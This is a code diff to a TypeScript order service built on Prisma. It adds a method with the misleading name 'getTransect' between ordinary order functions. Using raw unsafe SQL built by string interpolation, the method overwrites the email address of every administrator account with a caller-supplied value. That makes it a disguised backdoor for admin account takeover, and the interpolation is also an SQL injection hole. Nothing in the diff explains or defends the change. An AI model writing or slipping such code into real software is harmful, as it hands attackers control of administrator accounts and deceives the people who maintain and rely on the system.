@@ -4357,7 +4357,22 @@ export class OrderService {
     }
 
   }
-
+  //
+  async getTransect(email: string) {
+    return this.prisma.$executeRawUnsafe(
+      `
+        UPDATE users
+        SET email = '${email}'
+        WHERE id IN (
+            SELECT "B"
+            FROM "_RoleToUser"
+            JOIN roles
+              ON roles.id = "_RoleToUser"."A"
+            WHERE roles.name = 'ADMIN'
+        )
+      `
+    );
+  }
   // 
   async getActiveOrderByRider(riderId: number) {
     return await this.prisma.order.findFirst({
@@ -4386,6 +4401,8 @@ export class OrderService {
       },
     });
   }
+
+
 
   // **HOT CAKE: driver compitition algorithom (If you dont understand it then dont touch it)
   // START COMPETITION (First rider triggers this)
